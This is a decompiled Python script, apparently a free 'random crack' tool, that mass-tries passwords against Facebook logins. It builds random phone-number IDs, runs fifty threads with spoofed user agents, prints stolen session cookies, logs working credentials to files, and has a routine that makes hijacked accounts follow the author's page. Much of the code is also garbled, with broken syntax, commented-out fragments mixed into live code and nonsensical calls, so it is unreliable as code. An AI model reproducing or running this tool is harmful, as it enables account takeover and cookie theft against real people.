 Source Generated with Decompyle++
# File: test.pyc (Python 3.9)

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')
os.system('https://t.me/Awaz_Tech')
class jalan:
    
    def __init__(self, z):
        pass


#logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mAWAZ\x1b[0;m\x1b[1;32m && \x1b[1;33mKAWAZ\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m AWAZ TECH\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mAWAZ\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'

def ud():
  #  os.system('clear')
   # jalan(logo)
  #  print(' [1] SUBSCRIBE MY CHANNEL')
#    print(' [2] EXIT')
   # opt = input('\n   Choose option >>> ')
 #   if opt == '1':
     #   os.system('xdg-open https://www.youtube.com/@AwazTech')
      #  FD()
   #     return None
 #   None('\n\x1b[1;31mEXIT\x1b[0;97m')


#def FD():
  #  os.system('clear')
   # print(logo)
   # print('\x1b[1;33m [1] SUBSCRIBE MY FRIEND CHANNEL')
   # print(' [2] EXIT')
  #  opt = input('\n  \x1b[1;32m Choose option >>> ')
  #  if opt == '1':
       # os.system('xdg-open https://www.youtube.com/@AwazTech')
    #    o()
       # return None
  #  None('\n\x1b[1;31mEXIT\x1b[0;97m')
#def o():
    os.system('clear')
    jalan(logo)
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;32m RANDOM CRACK ')
    jalan('\x1b[1;32m [2] \x1b[1;32mJOIN TO MY CHANNEL')
  #  jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
  #  jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN FB GROUP')
    jalan(' \x1b[1;32m[0] \x1b[1;32mEXIT')
    opt = input('\n\x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        os.system('https://t.me/Awaz_Tech')
        return None
    if None == '3':
        os.system('exit')
        return None
  #  if None == '4':
     #   os.system('xdg-open https://facebook.com/groups/551100020207991/')
      #  return None
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://www.alpha.facebook.com/ajax/webstorage/process_keys/?state=1",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/AwazTech077/, {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""\033[1;37m

           
           
      
                  
                
            
....###....##......##....###....########.########.########..######..##.....##
...##.##...##..##..##...##.##........##.....##....##.......##....##.##.....##
..##...##..##..##..##..##...##......##......##....##.......##.......##.....##
.##.....##.##..##..##.##.....##....##.......##....######...##.......#########
.#########.##..##..##.#########...##........##....##.......##.......##.....##
.##.....##.##..##..##.##.....##..##.........##....##.......##....##.##.....##
.##.....##..###..###..##.....##.########....##....########..######..##.....##                                                             

\033[92m ------------------------------------------------\033[0m 
\033[92m Owner   :   Awaz_Tech\033[0m 
\033[92m Facebook:   Mohammad_Tanha\033[0m 
\033[92m Github  :   Private\033[0m 
\033[92m STATUS  :   Free\033[0m  
\033[92m Version :   0.1\033[0m 
\033[92m------------------------------------------------\033[0m""") 
loop = 0
oks = []
cps = []

os.system(f'https://www.youtube.com/@AwazTech')
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;36m     \t     AFG CODES\n     \033[1;33m9377, \033[1;33m9378 ,\033[1;33m9389 ,\033[1;33m9375  ...\033[0;97m')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;32m TOTAL IDS: '+tl)
        print('\033[1;32m THE PROCESS HAS BEEN STARTED')
        print('\033[1;37m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            ''accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=3Z2mZGGVrsPQHTGJumJBTuPp; sb=3Z2mZNvOpB6AMoPFk8lQn1Qz; locale=en_US; dpr=1.875; sfau=AYhTe9FWb_eFgHkih4Qj5S3P-2294JriMUSJsaIEHINMhOcZFjf0Rd9wf1uOdU4hNtx8a-pJnK1cYqNM7WtGrFy8g9CTFi7ZjP4STXPybeBnsK5qVsW19CET-FsYb82FF8fOEHtMEpkmVhsCU1orO6SwHVBWplX1uCs7HeajREcJ8Y5srQr7CvUWJ2HpLOgP7C_Khyu3p5y-f-hJTnO5JDLC8NASq_3r6QMgdoDXTIL6yA; fr=0PYWCtuQnmxYe7zpD..Bkpp3d.h-.AAA.0.0.BkpqPr.AWUUDBHcJKs; wd=980x999',
    'origin': 'https://www.alpha.facebook.com',
    'referer': 'https://www.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
            "user-agent": pro}
            lo = session.post('https://www.alpha.facebook.com/ajax/webstorage/process_keys/=1',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(AWAZTECH-OKðŸ”¥)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AWAZTECH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AWAZTECH-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AWAZTECH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[AWAZTECH] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
ud()
 
